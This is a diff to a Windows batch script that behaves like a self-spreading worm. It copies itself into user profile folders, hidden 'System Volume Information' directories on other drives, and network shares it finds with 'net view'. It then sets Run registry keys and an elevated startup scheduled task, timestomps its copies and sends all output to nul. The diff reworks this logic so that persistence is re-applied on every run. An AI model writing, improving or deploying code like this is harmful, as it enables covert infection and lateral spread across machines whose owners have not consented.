@@ -119,16 +119,15 @@ if not exist "%path_autoRun2%\%~nx0" (
 
 
 for %%i in (localAppData appData) do (
-  if exist "!%%i!\%~nx0" (
-    (
-      call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
-      call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
-      call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
-      call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /
-      call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
-      call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
-    )>nul 2>nul
-  ) else call copy /y "%~dpnx0" "!%%i!\"
+  if not exist "!%%i!\%~nx0" call copy /y "%~dpnx0" "!%%i!\"
+  (
+    call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
+    call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
+    call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+    call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /
+    call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+    call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
+  )>nul 2>nul
 )
 
 
@@ -137,10 +136,9 @@ for %%i in (localAppData appData) do (
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
-    if /i "%%j" == "System Volume Information" if not exist "%%i:\%%j\%~nx0" (
+    if /i "%%j" == "System Volume Information" (
+      if not exist "%%i:\%%j\%~nx0" copy /y "%~dpnx0" "%%i:\%%j\"
       attrib +h +s "%%i:\%%j"
-      copy /y "%~dpnx0" "%%i:\%%j\"
-    ) else (
       (
         %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
         reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
@@ -181,10 +179,9 @@ timeout /nobreak /t 5 >nul
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
-      if /i "%%j" == "System Volume Information" if not exist "%%h\%%i\%%j\%~nx0" (
+      if /i "%%j" == "System Volume Information" (
+        if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~dpnx0" "%%h\%%i\%%j\"
         attrib +h +s "%%h\%%i\%%j"
-        copy /y "%~dpnx0" "%%h\%%i\%%j\"
-      ) else (
         (
           %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
           reg add %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
